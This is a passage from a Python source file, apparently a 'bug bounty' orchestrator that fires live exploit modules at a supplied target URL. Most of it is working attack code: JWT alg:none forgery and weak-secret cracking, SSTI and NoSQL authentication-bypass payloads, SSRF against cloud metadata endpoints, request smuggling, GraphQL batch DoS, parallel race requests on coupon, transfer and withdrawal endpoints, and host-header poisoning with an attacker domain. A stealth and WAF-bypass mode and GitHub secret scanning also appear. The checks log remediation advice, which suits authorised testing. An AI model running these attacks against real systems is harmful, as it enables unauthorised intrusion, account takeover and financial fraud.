                    evidence=f"Enumerated users: {users}",
                    remediation="Disable /wp-json/wp/v2/users for unauthenticated users. Use plugin: Disable REST API.",
                    cvss=5.3,
                    tags=["ACCOUNT_ENUM", "WORDPRESS"],
                    phase="GENERIC",
                ))
                if verbose:
                    print(f"  {Y}[GENERIC-004]{RST} WordPress user enum: {users}")
        except Exception:
            pass
    # xmlrpc brute enablement check
    xmlrpc_url = base.rstrip("/") + "/xmlrpc.php"
    sx, bx, _ = await req(
        session, "POST", xmlrpc_url,
        headers={"Content-Type": "text/xml"},
        data=b"<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName><params/></methodCall>",
    )
    if sx == 200 and "methodResponse" in bx:
        findings.append(Finding(
            cve="GENERIC-004b",
            severity="MEDIUM",
            title="WordPress XMLRPC Enabled (Brute Force Amplification)",
            url=xmlrpc_url,
            evidence=f"XML-RPC system.listMethods returned {sx}. Methods accessible.",
            remediation="Disable xmlrpc.php or restrict to trusted IPs.",
            cvss=5.3,
            tags=["AUTH_BYPASS", "WORDPRESS"],
            phase="GENERIC",
        ))
        if verbose:
            print(f"  {Y}[GENERIC-004b]{RST} WordPress xmlrpc.php enabled")
    return findings


# ── GENERIC-005 — GraphQL introspection + batch abuse ─────────────────────────

async def generic_graphql(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    findings = []
    gql_paths = ["/graphql", "/api/graphql", "/v1/graphql", "/gql", "/query"]
    for path in gql_paths:
        url = base.rstrip("/") + path
        # Introspection probe
        introspect = {"query": "{ __schema { queryType { name } } }"}
        s, b, _ = await req(session, "POST", url, json_body=introspect)
        if s == 200 and "__schema" in b:
            # Full introspection
            full_query = {
                "query": """{ __schema { types { name fields { name type { name kind ofType { name kind } } args { name } } } } }"""
            }
            sf, bf, _ = await req(session, "POST", url, json_body=full_query)
            sensitive = re.findall(r'"name"\s*:\s*"(password|token|secret|ssn|credit|card|key|private)[^"]*"', bf, re.I)
            findings.append(Finding(
                cve="GENERIC-005",
                severity="HIGH" if sensitive else "MEDIUM",
                title="GraphQL Introspection Enabled" + (" + Sensitive Fields" if sensitive else ""),
                url=url,
                evidence=f"Introspection accessible. Sensitive fields: {sensitive[:10]}",
                remediation="Disable introspection in production. Use allowlist for query depth/complexity.",
                cvss=7.5 if sensitive else 5.3,
                tags=["GRAPHQL", "INFO_DISC"],
                phase="GENERIC",
            ))
            if verbose:
                print(f"  {Y}[GENERIC-005]{RST} GraphQL introspection at {url}")

            # Batch DoS probe
            batch = [{"query": "{ __typename }"} for _ in range(100)]
            t0 = time.time()
            sb, bb, _ = await req(session, "POST", url, json_body=batch, timeout=20)
            elapsed = time.time() - t0
            if sb == 200 and elapsed > 3:
                findings.append(Finding(
                    cve="GENERIC-005b",
                    severity="HIGH",
                    title="GraphQL Batch Query DoS",
                    url=url,
                    evidence=f"100-query batch took {elapsed:.1f}s (server-side processing confirmed).",
                    remediation="Implement query depth/complexity limits and batch size limits.",
                    cvss=7.5,
                    tags=["GRAPHQL", "RATE_LIMIT"],
                    phase="GENERIC",
                ))
                if verbose:
                    print(f"  {Y}[GENERIC-005b]{RST} GraphQL batch DoS {elapsed:.1f}s at {url}")
            break
    return findings


# ── GENERIC-006 — Exposed .git directory ──────────────────────────────────────

async def generic_git_exposure(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    findings = []
    git_paths = [
        ("/.git/HEAD", "ref:"),
        ("/.git/config", "[core]"),
        ("/.git/COMMIT_EDITMSG", None),
        ("/.git/logs/HEAD", "commit"),
        ("/.svn/entries", "dir"),
        ("/.hg/store/00manifest.i", None),
    ]
    for path, marker in git_paths:
        url = base.rstrip("/") + path
        s, b, _ = await req(session, "GET", url)
        if s == 200 and (marker is None or marker in b):
            vcs = ".git" if ".git" in path else ".svn" if ".svn" in path else ".hg"
            findings.append(Finding(
                cve="GENERIC-006",
                severity="HIGH",
                title=f"Exposed {vcs} Directory — Source Code Accessible",
                url=url,
                evidence=f"HTTP {s}; '{path}' accessible. May allow full source code reconstruction.",
                remediation=f"Block access to {vcs}/ in web server config. Remove from deployment.",
                cvss=7.5,
                tags=["INFO_DISC"],
                phase="GENERIC",
            ))
            if verbose:
                print(f"  {R}[GENERIC-006]{RST} VCS directory exposed at {url}")
            break
    return findings


# ── GENERIC-008 — Swagger/OpenAPI spec leak ────────────────────────────────────

async def generic_openapi_leak(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    findings = []
    spec_paths = [
        "/swagger.json", "/swagger.yaml", "/swagger/v1/swagger.json",
        "/api-docs", "/api-docs.json", "/api/swagger.json",
        "/openapi.json", "/openapi.yaml", "/v2/api-docs",
        "/v3/api-docs", "/api/openapi.json", "/docs/openapi.json",
        "/redoc", "/api/redoc", "/docs",
    ]
    for path in spec_paths:
        url = base.rstrip("/") + path
        s, b, _ = await req(session, "GET", url)
        if s == 200 and ('"paths"' in b or "'paths'" in b or "openapi" in b.lower() or "swagger" in b.lower()):
            # Count endpoints
            paths_count = len(re.findall(r'"/[^"]+"\s*:', b))
            sensitive_paths = re.findall(r'"/[^"]*(?:admin|internal|secret|token|key|password|user)[^"]*"', b, re.I)
            findings.append(Finding(
                cve="GENERIC-008",
                severity="MEDIUM",
                title="OpenAPI/Swagger Spec Exposed",
                url=url,
                evidence=f"~{paths_count} endpoint definitions. Sensitive paths: {sensitive_paths[:5]}",
                remediation="Restrict Swagger UI and spec files to internal networks or authenticated users.",
                cvss=5.3,
                tags=["INFO_DISC"],
                phase="GENERIC",
            ))
            if verbose:
                print(f"  {Y}[GENERIC-008]{RST} OpenAPI spec at {url} ({paths_count} paths)")
            break
    return findings


# ── GENERIC-011 — HTTP Request Smuggling (CL.TE probe) ────────────────────────

async def generic_http_smuggling(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    CL.TE probe: sends a request with both Content-Length and Transfer-Encoding.
    If backend uses TE and frontend uses CL, the body prefix "G" poisons next request.
    We detect by timing difference on ambiguous 0-chunk.
    """
    findings = []
    url = base.rstrip("/") + "/"
    smuggle_body = b"0\r\n\r\nG"
    try:
        async with session.post(
            url,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": "chunked",
                "Content-Length": str(len(smuggle_body) + 5),
            },
            data=smuggle_body,
            timeout=aiohttp.ClientTimeout(total=6),
        ) as r:
            s = r.status
            b = await r.text(errors="replace")
            if s in (400, 501):
                # Some servers explicitly reject TE smuggling
                pass
            elif s == 200:
                findings.append(Finding(
                    cve="GENERIC-011",
                    severity="HIGH",
                    title="Potential HTTP Request Smuggling (CL.TE)",
                    url=url,
                    evidence=f"Server accepted CL+TE request (HTTP {s}). Manual verification required with Burp Smuggler.",
                    remediation="Normalize requests at reverse proxy. Ensure frontend/backend agree on TE vs CL.",
                    cvss=8.0,
                    tags=["HTTP_SMUGGLING"],
                    phase="GENERIC",
                ))
                if verbose:
                    print(f"  {Y}[GENERIC-011]{RST} CL.TE smuggling candidate at {url}")
    except Exception:
        pass
    return findings


# ── GENERIC-013 — JWT none algorithm + weak secret ────────────────────────────

async def generic_jwt_attacks(session: aiohttp.ClientSession, base: str, token: Optional[str], verbose: bool) -> List[Finding]:
    findings = []
    if not token:
        return findings

    # Extract JWT from token
    jwt_raw = token.replace("Bearer ", "").replace("bearer ", "").strip()
    parts = jwt_raw.split(".")
    if len(parts) != 3:
        return findings

    try:
        # Decode header + payload (no verify)
        header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
        payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
        header = json.loads(base64.urlsafe_b64decode(header_b64))
        payload = json.loads(base64.urlsafe_b64decode(payload_b64))
    except Exception:
        return findings

    alg = header.get("alg", "")

    # alg:none bypass
    none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    payload_b = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    none_jwt = f"{none_header}.{payload_b}."
    none_variants = [
        none_jwt,
        f"{base64.urlsafe_b64encode(json.dumps({'alg':'NONE','typ':'JWT'}).encode()).rstrip(b'=').decode()}.{payload_b}.",
        f"{base64.urlsafe_b64encode(json.dumps({'alg':'None','typ':'JWT'}).encode()).rstrip(b'=').decode()}.{payload_b}.",
    ]

    # Try to find an authenticated endpoint to test against
    auth_endpoints = ["/api/me", "/api/user", "/api/profile", "/me", "/api/v1/me", "/api/v1/user"]
    test_url = None
    for ep in auth_endpoints:
        su, bu, _ = await req(session, "GET", base.rstrip("/") + ep, headers={"Authorization": f"Bearer {jwt_raw}"})
        if su == 200:
            test_url = base.rstrip("/") + ep
            break

    if test_url:
        for variant in none_variants:
            s_none, b_none, _ = await req(session, "GET", test_url, headers={"Authorization": f"Bearer {variant}"})
            if s_none == 200:
                findings.append(Finding(
                    cve="GENERIC-013",
                    severity="CRITICAL",
                    title="JWT Algorithm None Bypass",
                    url=test_url,
                    evidence=f"alg:none accepted at {test_url}. Response: {b_none[:200]}",
                    remediation="Explicitly whitelist allowed JWT algorithms. Reject 'none' algorithm.",
                    cvss=9.8,
                    tags=["JWT", "AUTH_BYPASS"],
                    phase="GENERIC",
                ))
                if verbose:
                    print(f"  {R}[GENERIC-013]{RST} JWT alg:none bypass at {test_url}")
                break

        # Weak HS256 secret brute
        if alg == "HS256":
            import hmac, hashlib as _hashlib
            weak_secrets = [
                "secret", "password", "123456", "jwt_secret", "your-256-bit-secret",
                "changeme", "supersecret", "mysecret", "jwttoken", "key",
                "dev", "prod", "app_secret", "api_key", "token",
            ]
            sig_input = f"{parts[0]}.{parts[1]}".encode()
            expected_sig = parts[2]
            for secret in weak_secrets:
                sig = base64.urlsafe_b64encode(
                    hmac.new(secret.encode(), sig_input, _hashlib.sha256).digest()
                ).rstrip(b"=").decode()
                if sig == expected_sig:
                    findings.append(Finding(
                        cve="GENERIC-013b",
                        severity="CRITICAL",
                        title=f"JWT Weak HS256 Secret Cracked: '{secret}'",
                        url=test_url,
                        evidence=f"JWT signed with weak secret '{secret}'. Attacker can forge arbitrary tokens.",
                        remediation="Use cryptographically random secret ≥32 bytes. Rotate immediately.",
                        cvss=9.8,
                        tags=["JWT", "AUTH_BYPASS"],
                        phase="GENERIC",
                    ))
                    if verbose:
                        print(f"  {R}[GENERIC-013b]{RST} JWT weak secret '{secret}' at {test_url}")
                    break
    return findings


# ── GENERIC-016 — SSTI polyglot ───────────────────────────────────────────────

async def generic_ssti(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    findings = []
    # Polyglot that works across Jinja2, Twig, Freemarker, Velocity, Pebble
    payloads = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("{7*7}", "49"),
        ("#{7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("{{7*'7'}}", "7777777"),  # Jinja2 vs Twig differentiator
        ("${{7*7}}", "49"),
    ]
    # Test GET params that commonly reflect into templates
    param_paths = [
        ("/search?q=PAYLOAD", "GET"),
        ("/api/render?template=PAYLOAD", "GET"),
        ("/?error=PAYLOAD", "GET"),
        ("/?message=PAYLOAD", "GET"),
        ("/404/PAYLOAD", "GET"),
    ]
    for path_template, method in param_paths:
        for payload, expected in payloads:
            url = base.rstrip("/") + path_template.replace("PAYLOAD", urllib.parse.quote(payload))
            s, b, _ = await req(session, method, url)
            if s != 0 and expected in b:
                findings.append(Finding(
                    cve="GENERIC-016",
                    severity="CRITICAL",
                    title=f"Server-Side Template Injection ({payload} → {expected})",
                    url=url,
                    evidence=f"Template expression evaluated: {payload} → {expected} in response.",
                    remediation="Never pass user input directly to template rendering. Use sandboxed templates.",
                    cvss=9.8,
                    tags=["SSTI", "RCE"],
                    phase="GENERIC",
                ))
                if verbose:
                    print(f"  {R}[GENERIC-016]{RST} SSTI at {url}")
    return findings


# ── GENERIC-018 — SSRF via URL parameters ─────────────────────────────────────

async def generic_ssrf(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    findings = []
    ssrf_params = ["url", "webhook", "callback", "redirect", "next", "target", "src",
                   "href", "endpoint", "proxy", "fetch", "load", "image", "avatar", "logo"]
    imds_urls = [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://169.254.169.254/metadata/instance",
    ]
    # Discover param-accepting endpoints from common paths
    test_paths = ["/api/fetch", "/api/proxy", "/api/webhook", "/webhook", "/api/v1/import"]
    for path in test_paths:
        for imds in imds_urls[:1]:  # Just test one IMDS to avoid noise
            url = base.rstrip("/") + path
            # Try JSON body
            s, b, _ = await req(session, "POST", url, json_body={"url": imds})
            if s == 200 and any(x in b for x in ["ami-id", "instance-id", "computeMetadata", "identity"]):
                findings.append(Finding(
                    cve="GENERIC-018",
                    severity="CRITICAL",
                    title="SSRF → Cloud Metadata (IMDS) via POST body",
                    url=url,
                    evidence=f"IMDS response: {b[:300]}",
                    remediation="Block IMDS/loopback in outbound URL validator. Require allowlist for fetch URLs.",
                    cvss=9.1,
                    tags=["SSRF"],
                    phase="GENERIC",
                ))
                if verbose:
                    print(f"  {R}[GENERIC-018]{RST} SSRF → IMDS at {url}")
    return findings


# ── GENERIC-019 — Race condition on financial endpoints ────────────────────────

async def generic_race_condition(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    findings = []
    race_paths = [
        "/api/v1/coupon/apply",
        "/api/coupon/redeem",
        "/api/v1/referral/apply",
        "/api/loyalty/redeem",
        "/api/v1/transfer",
        "/api/withdraw",
        "/api/v1/order/create",
    ]
    for path in race_paths:
        url = base.rstrip("/") + path
        # Quick check if endpoint exists
        s_check, _, _ = await req(session, "POST", url, json_body={"code": "TEST", "coupon": "TEST"})
        if s_check == 0:
            continue
        if s_check in (404, 405):
            continue

        # Fire 20 parallel requests
        payload = {"code": "RACE_TEST_HUNT", "coupon": "RACE_TEST_HUNT", "amount": 0.01}
        tasks = [req(session, "POST", url, json_body=payload) for _ in range(20)]
        t0 = time.time()
        results = await asyncio.gather(*tasks)
        elapsed = time.time() - t0

        successes = [r for r in results if r[0] == 200]
        if len(successes) > 1:
            findings.append(Finding(
                cve="GENERIC-019",
                severity="HIGH",
                title=f"Race Condition on {path}",
                url=url,
                evidence=f"{len(successes)}/20 parallel requests returned 200 in {elapsed:.2f}s.",
                remediation="Use database-level locks or atomic operations. Implement idempotency keys.",
                cvss=7.5,
                tags=["RACE_CONDITION", "BUSINESS_LOGIC"],
                phase="GENERIC",
            ))
            if verbose:
                print(f"  {R}[GENERIC-019]{RST} Race condition: {len(successes)}/20 successes at {url}")
    return findings


# ── GENERIC-020 — Password reset host header poisoning ────────────────────────

async def generic_host_header_poison(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    findings = []
    reset_paths = [
        "/api/v1/password/reset",
        "/api/password/reset",
        "/auth/reset",
        "/user/reset-password",
        "/api/forgot-password",
        "/password-reset",
    ]
    evil_host = "evil-attacker.com"
    for path in reset_paths:
        url = base.rstrip("/") + path
        s_base, b_base, _ = await req(session, "POST", url, json_body={"email": "test@example.com"})
        if s_base == 0 or s_base == 404:
            continue

        # Inject evil host
        s_evil, b_evil, _ = await req(
            session, "POST", url,
            headers={"Host": evil_host, "X-Forwarded-Host": evil_host},
            json_body={"email": "test@example.com"},
        )
        if s_evil not in (0, 404):
            findings.append(Finding(
                cve="GENERIC-020",
                severity="HIGH",
                title=f"Password Reset Host Header Poisoning at {path}",
                url=url,
                evidence=f"Reset endpoint accepts X-Forwarded-Host: {evil_host}. If reset link generated from Host header, attacker intercepts token.",
                remediation="Hardcode password reset domain. Never derive reset URL from Host or X-Forwarded-Host headers.",
                cvss=8.0,
                tags=["HOST_HEADER", "AUTH_BYPASS"],
                phase="GENERIC",
            ))
            if verbose:
                print(f"  {Y}[GENERIC-020]{RST} Host header poison candidate at {url}")
    return findings


# ── GENERIC-024 — NoSQL injection ─────────────────────────────────────────────

async def generic_nosql_injection(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    findings = []
    login_paths = ["/api/login", "/api/auth/login", "/api/v1/login", "/auth/login", "/login"]
    nosql_payloads = [
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
        {"username": "admin", "password": {"$gt": ""}},
        {"$where": "1==1"},
    ]
    for path in login_paths:
        url = base.rstrip("/") + path
        # Normal failed login
        s_fail, b_fail, _ = await req(session, "POST", url, json_body={"username": "nonexistent_user_xyz", "password": "wrongpassword123"})
        if s_fail == 0 or s_fail == 404:
            continue

        for payload in nosql_payloads:
            s_inj, b_inj, _ = await req(session, "POST", url, json_body=payload)
            if s_inj == 200 and s_fail != 200:
                findings.append(Finding(
                    cve="GENERIC-024",
                    severity="CRITICAL",
                    title=f"NoSQL Injection Authentication Bypass at {path}",
                    url=url,
                    evidence=f"Payload {payload} returned {s_inj} (normal: {s_fail}). Response: {b_inj[:200]}",
                    remediation="Validate and sanitize all input. Use parameterized queries. Reject operator keys ($gt, $ne, $where).",
                    cvss=9.8,
                    tags=["NOSQL", "AUTH_BYPASS", "INJECTION"],
                    phase="GENERIC",
                ))
                if verbose:
                    print(f"  {R}[GENERIC-024]{RST} NoSQL injection bypass at {url}")
                break
    return findings


# ── GENERIC-012 — CORS misconfiguration ───────────────────────────────────────

async def generic_cors(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    findings = []
    url = base.rstrip("/") + "/api/me"
    test_origins = [
        "https://evil.com",
        "null",
        f"https://evil.{urllib.parse.urlparse(base).hostname}",
        f"https://{urllib.parse.urlparse(base).hostname}.evil.com",
        f"https://attacker{urllib.parse.urlparse(base).hostname}",
    ]
    for origin in test_origins:
        s, b, h = await req(session, "GET", url, headers={"Origin": origin})
        acao = h.get("Access-Control-Allow-Origin", "")
        acac = h.get("Access-Control-Allow-Credentials", "")
        if acao in (origin, "*") and acac.lower() == "true":
            findings.append(Finding(
                cve="GENERIC-012",
                severity="HIGH",
                title=f"CORS Misconfiguration — Origin Reflection with Credentials",
                url=url,
                evidence=f"Origin: {origin} → ACAO: {acao}, ACAC: {acac}",
                remediation="Validate Origin against explicit allowlist. Never reflect arbitrary origins with ACAC: true.",
                cvss=8.0,
                tags=["CORS"],
                phase="GENERIC",
            ))
            if verbose:
                print(f"  {R}[GENERIC-012]{RST} CORS misconfig: {origin} → {acao}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════════════

CVE_MODULES = [
    ("CVE-2025-29927 Next.js middleware bypass",      cve_2025_29927),
    ("CVE-2025-24813 Tomcat partial PUT",             cve_2025_24813),
    ("CVE-2024-38819/38816 Spring path traversal",    cve_2024_spring_traversal),
    ("CVE-2024-22243 Spring Security bypass",         cve_2024_22243),
    ("CVE-2024-27198 TeamCity auth bypass",           cve_2024_27198),
    ("CVE-2024-23897 Jenkins CLI LFI",                cve_2024_23897),
    ("CVE-2024-34102 Magento XXE CosmicSting",        cve_2024_34102),
    ("CVE-2024-28955/9264 Grafana traversal+SQLi",    cve_2024_grafana),
    ("CVE-2023-50164 Struts2 S2-066 upload",          cve_2023_50164),
    ("GENERIC-001 Laravel debug/.env",                generic_laravel_debug),
    ("GENERIC-002 Django DEBUG+admin",                generic_django_debug),
    ("GENERIC-004 WordPress user enum",               generic_wordpress_enum),
    ("GENERIC-005 GraphQL introspection+batch",       generic_graphql),
    ("GENERIC-006 Exposed .git directory",            generic_git_exposure),
    ("GENERIC-008 OpenAPI/Swagger spec leak",         generic_openapi_leak),
    ("GENERIC-011 HTTP Request Smuggling CL.TE",      generic_http_smuggling),
    ("GENERIC-012 CORS misconfiguration",             generic_cors),
    ("GENERIC-016 SSTI polyglot",                     generic_ssti),
    ("GENERIC-018 SSRF via URL params",               generic_ssrf),
    ("GENERIC-019 Race condition financial",          generic_race_condition),
    ("GENERIC-020 Password reset host poison",        generic_host_header_poison),
    ("GENERIC-024 NoSQL injection",                   generic_nosql_injection),
]

# JWT needs token so wrap separately
async def run_jwt_module(session, base, token, verbose):
    return await generic_jwt_attacks(session, base, token, verbose)


async def run_cve_modules(
    base: str,
    token: Optional[str],
    proxy: Optional[str],
    cookies: Optional[str],
    concurrency: int,
    delay: int,
    verbose: bool,
) -> List[Finding]:
    print(f"\n{B}{BOLD}[Phase 3] CVE & Generic Exploit Modules ({len(CVE_MODULES)+1} checks){RST}")
    print(f"  {DIM}Against {base}{RST}\n")

    findings = []
    session = build_session(token, cookies, proxy, delay)
    sem = asyncio.Semaphore(concurrency)

    async def run_one(name, fn):
        async with sem:
            print(f"  {DIM}» {name}{RST}")
            try:
                if delay:
                    await asyncio.sleep(delay / 1000)
                result = await fn(session, base, verbose)
                for f in result:
                    print(f"    {sev(f.severity)} [{f.cve}] {f.title}")
                return result
            except Exception as e:
                if verbose:
                    print(f"    {DIM}Error in {name}: {e}{RST}")
                return []

    tasks = [run_one(name, fn) for name, fn in CVE_MODULES]
    # JWT needs token arg
    tasks.append(run_one("GENERIC-013 JWT attacks", lambda s, b, v: run_jwt_module(s, b, token, v)))

    results = await asyncio.gather(*tasks)
    for r in results:
        findings.extend(r)
    await session.close()
    return findings


async def run_extended_cve_modules(
    base: str,
    token: Optional[str],
    proxy: Optional[str],
    cookies: Optional[str],
    concurrency: int,
    delay: int,
    verbose: bool,
) -> List[Finding]:
    findings = []
    session = build_session(token, cookies, proxy, delay)
    sem = asyncio.Semaphore(concurrency)

    async def run_one(name, fn):
        async with sem:
            print(f"  {DIM}» {name}{RST}")
            try:
                if delay:
                    await asyncio.sleep(delay / 1000)
                result = await fn(session, base, verbose)
                for f in result:
                    print(f"    {sev(f.severity)} [{f.cve}] {f.title}")
                return result
            except Exception as e:
                if verbose:
                    print(f"    {DIM}Error in {name}: {e}{RST}")
                return []

    tasks = [run_one(name, fn) for name, fn in CVE_EXTENDED_MODULES]
    results = await asyncio.gather(*tasks)
    for r in results:
        findings.extend(r)
    await session.close()
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# RECON + GOV_LEVEL SUBPROCESS RUNNERS
# ═══════════════════════════════════════════════════════════════════════════════

def run_subprocess(cmd: List[str], label: str, outfile: str, verbose: bool) -> Optional[dict]:
    print(f"\n{B}{BOLD}[{label}]{RST} {' '.join(cmd)}")
    try:
        result = subprocess.run(
            cmd,
            capture_output=not verbose,
            text=True,
            timeout=600,
        )
        if verbose and result.stdout:
            print(result.stdout[-3000:])  # last 3000 chars
        if result.returncode != 0 and verbose:
            print(f"  {Y}[warn]{RST} {label} exited {result.returncode}: {result.stderr[:500]}")
        if os.path.exists(outfile):
            with open(outfile, encoding="utf-8") as f:
                return json.load(f)
    except subprocess.TimeoutExpired:
        print(f"  {Y}[timeout]{RST} {label} exceeded 10 minutes")
    except Exception as e:
        print(f"  {Y}[error]{RST} {label}: {e}")
    return None


# ═══════════════════════════════════════════════════════════════════════════════
# REPORT GENERATOR
# ═══════════════════════════════════════════════════════════════════════════════

def generate_report(
    findings: List[Finding],
    recon_data: Optional[dict],
    gov_data: Optional[dict],
    base: str,
    outdir: str,
) -> str:
    ts = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
    host = urllib.parse.urlparse(base).hostname or base

    # Sort by severity
    findings.sort(key=lambda f: SEVERITY_ORDER.get(f.severity, 5))

    # Summary counts
    counts = {s: sum(1 for f in findings if f.severity == s) for s in SEVERITY_ORDER}

    # Markdown report
    lines = [
        f"# Bug Bounty Hunt Report — {host}",
        f"**Target:** {base}  ",
        f"**Date:** {ts}  ",
        f"**Tool:** hunt.py (recon + gov_level + CVE modules)  ",
        "",
        "## Severity Summary",
        "",
        "| Severity | Count |",
        "|----------|-------|",
    ]
    for s, c in counts.items():
        if c > 0:
            lines.append(f"| {s} | {c} |")

    lines += ["", "---", "", "## Findings", ""]

    for i, f in enumerate(findings, 1):
        lines += [
            f"### [{i}] {f.title}",
            f"**CVE/ID:** `{f.cve}`  ",
            f"**Severity:** {f.severity} (CVSS {f.cvss})  ",
            f"**URL:** `{f.url}`  ",
            f"**Tags:** {', '.join(f.tags)}  ",
            "",
            f"**Evidence:**  ",
            f"```",
            f.evidence[:500],
            "```",
            "",
            f"**Remediation:** {f.remediation}",
            "",
        ]
        if f.request:
            lines += ["**Request:**", "```http", f.request[:300], "```", ""]
        if f.response_snippet:
            lines += ["**Response snippet:**", "```", f.response_snippet[:300], "```", ""]
        lines.append("---")
        lines.append("")

    # Include recon summary
    if recon_data:
        ep_count = len(recon_data.get("endpoints", []))
        subdomain_count = len(recon_data.get("subdomains", []))
        lines += [
            "## Recon Summary",
            f"- **Endpoints discovered:** {ep_count}",
            f"- **Subdomains probed:** {subdomain_count}",
            "",
        ]
        high_value = [e for e in recon_data.get("endpoints", []) if e.get("tags")]
        lines += ["### High-Value Endpoints", ""]
        for ep in high_value[:30]:
            lines.append(f"- `{ep.get('url','')}` [{ep.get('status',0)}] tags={ep.get('tags',[])} — {ep.get('notes',[''])[0][:80]}")
        lines.append("")

    if gov_data:
        gov_findings = gov_data.get("findings", [])
        lines += [
            "## Gov-Level Check Summary",
            f"- **Findings:** {len(gov_findings)}",
            "",
        ]
        for gf in gov_findings[:20]:
            lines.append(f"- **{gf.get('severity','')}** [{gf.get('check','')}] {gf.get('title','')} — `{gf.get('url','')}`")
        lines.append("")

    md = "\n".join(lines)
    md_path = os.path.join(outdir, "report.md")
    with open(md_path, "w", encoding="utf-8") as f:
        f.write(md)

    # JSON output
    json_out = {
        "target": base,
        "timestamp": ts,
        "summary": counts,
        "findings": [
            {
                "cve": f.cve, "severity": f.severity, "title": f.title,
                "url": f.url, "evidence": f.evidence[:500],
                "remediation": f.remediation, "cvss": f.cvss,
                "tags": f.tags, "phase": f.phase,
            }
            for f in findings
        ],
        "recon_endpoints": len(recon_data.get("endpoints", [])) if recon_data else 0,
        "recon_subdomains": len(recon_data.get("subdomains", [])) if recon_data else 0,
    }
    json_path = os.path.join(outdir, "findings.json")
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(json_out, f, indent=2, ensure_ascii=False)

    return md_path


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

async def main():
    banner()
    parser = argparse.ArgumentParser(description="Unified Bug Bounty Orchestrator", add_help=True)
    parser.add_argument("target", help="Target base URL (e.g. https://app.example.com)")
    parser.add_argument("-t", "--token", help="Auth token (Bearer JWT, cookie string, or API key)")
    parser.add_argument("-c", "--concurrency", type=int, default=30)
    parser.add_argument("-o", "--output", help="Output directory (default: results_<host>_<ts>/)")
    parser.add_argument("--proxy", help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--delay", type=int, default=100, help="ms delay between requests (default 100)")
    parser.add_argument("--cookies", help='Cookie string "name=val; name2=val2"')
    parser.add_argument("--no-recon", action="store_true", help="Skip recon.py phase")
    parser.add_argument("--no-gov", action="store_true", help="Skip gov_level.py phase")
    parser.add_argument("--cve-only", action="store_true", help="CVE modules only")
    parser.add_argument("--tech", help="Tech hint: spring|laravel|django|rails|next|express")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode (UA rotation, WAF bypass headers)")
    parser.add_argument("--waf", help="Force WAF: cloudflare|akamai|aws_waf|imperva|modsecurity|f5_asm")
    parser.add_argument("--tools", action="store_true", help="Run external tools (nuclei, ffuf, sqlmap, dalfox, etc.)")
    parser.add_argument("--tools-only", help="Comma-separated tool list: nuclei,ffuf,sqlmap")
    parser.add_argument("--no-extended", action="store_true", help="Skip cve_extended.py modules")
    parser.add_argument("--infra", action="store_true", help="Run infrastructure phase (ports, ASN, buckets, GitHub)")
    parser.add_argument("--full-ports", action="store_true", help="Full 1-65535 port scan during infra phase")
    parser.add_argument("--asn-range", action="store_true", help="Reverse-DNS scan ASN CIDR ranges (slow)")
    parser.add_argument("--github-org", help="GitHub org to scan for secrets (e.g. --github-org robinhood)")
    parser.add_argument("--ghost", action="store_true", help="Real Chromium browser scan (CDP stealth, DOM XSS, JS analysis, screenshot)")
    parser.add_argument("--ghost-login", help="Login URL for ghost browser authenticated scan")
    parser.add_argument("--ghost-user", help="Username/email for ghost login")
    parser.add_argument("--ghost-pass", help="Password for ghost login")
    parser.add_argument("--intel", action="store_true", help="Deep intelligence: attack chains, Wayback endpoints, source maps, entropy secrets")
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    base = args.target.rstrip("/")
    ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    host = urllib.parse.urlparse(base).hostname or "target"

    # Output directory
    outdir = args.output or f"results_{host}_{ts}"
    os.makedirs(outdir, exist_ok=True)
    print(f"{G}[+]{RST} Output: {BOLD}{outdir}/{RST}\n")

    recon_data = None
    gov_data = None
    all_findings: List[Finding] = []
    waf_result = None
    infra_result = None

    script_dir = os.path.dirname(os.path.abspath(__file__))

    # ── Phase 0: Infrastructure Enumeration ───────────────────────────────────
    if (args.infra or getattr(args, "github_org", None)) and _HAS_INFRA:
        try:
            infra_result = await enumerate_infrastructure(
                target=base,
                outdir=outdir,
                full_port_scan=getattr(args, "full_ports", False),
                scan_asn_range=getattr(args, "asn_range", False),
                buckets=True,
                github_org=getattr(args, "github_org", "") or "",
                verbose=args.verbose,
                concurrency=args.concurrency,
            )
            # Promote critical infra findings to all_findings
            for bucket in infra_result.storage_buckets:
                if bucket.get("status") == "open":
                    all_findings.append(Finding(
                        cve="INFRA-S3-OPEN",
                        severity="CRITICAL",
                        title=f"Open {bucket['service'].upper()} Bucket: {bucket['url']}",
                        url=bucket["url"],
                        evidence=f"Bucket listing accessible. Keys: {bucket.get('keys_preview',[])}",
